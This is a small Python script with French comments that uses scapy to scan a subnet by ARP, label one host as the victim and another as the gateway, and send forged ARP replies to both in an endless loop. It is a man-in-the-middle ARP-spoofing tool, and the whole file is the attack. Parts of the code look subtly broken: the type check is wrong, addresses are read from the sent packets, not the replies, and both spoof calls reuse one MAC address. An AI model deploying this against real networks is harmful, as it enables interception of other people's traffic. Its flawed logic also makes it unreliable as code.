import scapy.all as scapy
import sys


def ARP_Spoof(Network = str):
    assert Network != str, "Network n'est pas une string"
    
    """
    Veuillez précisez si le masque est en /22 ou /24. Exemple d'ip : 10.10.10.0/24.
    """

    MAC = [] #Variable de stockage des adresses MAC
    IP = [] #Variable de stockage des adresses IP

    print("[*] Scan en cours [...]") 

    ans= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = Network), timeout = 2, inter = 0.1)[0]
    # Scan ARP pour récupérer les adresses
    

    for i in range(len(ans)): # Stock des adresses MAC et IP
        MAC.append(ans[i][0].hwsrc)
        IP.append(ans[i][0].psrc)

    print(MAC)
    print(IP)
    
    print("[*]VICTIME : Adresse Mac ",MAC[1],", IP  ",IP[1],"\n [*]GATEWAY : Adresse Mac ",MAC[2]," IP ",IP[2])
    
    def spoof(ip_1 , ip_2): 
        packet = scapy.ARP(op = 2, pdst = ip_1, hwdst = MAC[1], psrc = ip_2)
        scapy.send(packet, verbose = False)

    while True: # Redistribution des requêtes ARP 
            spoof(IP[1], IP[2])
            spoof(IP[2], IP[1])

if __name__ == '__main__':
    globals()[sys.argv[1]](sys.argv[2])
